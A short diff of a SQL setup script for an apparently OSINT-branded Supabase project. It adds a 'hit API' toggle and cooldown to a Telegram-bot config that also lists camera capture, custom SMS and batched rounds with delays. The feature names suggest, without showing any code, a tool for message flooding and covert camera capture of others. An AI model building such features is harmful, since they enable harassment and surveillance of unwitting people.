@@ -2,8 +2,9 @@
 -- SHUBH OSINT - Complete Supabase Database Setup
 -- =====================================================
 -- Run this SQL in your new Supabase project's SQL Editor
--- Last Updated: 2026-04-02
--- Version: 5.4 (Camera Capture + Service Toggles)
+-- Last Updated: 2026-04-04
+-- Version: 5.5 (Hit API Service Toggle + Cooldown + Persistent Camera Links)
+-- =====================================================
 -- =====================================================
 -- NOTE: Credit system has been REMOVED. Authentication is now
 -- handled by simple site password (stored in app_settings).
@@ -522,7 +523,9 @@ VALUES ('tgbot_config', '{
   "defaultRounds": 1,
   "defaultBatch": 5,
   "defaultDelay": 2,
+  "hitCooldownMinutes": 5,
   "services": {
+    "hitApi": true,
     "schedule": true,
     "customSms": true,
     "cameraCapture": true
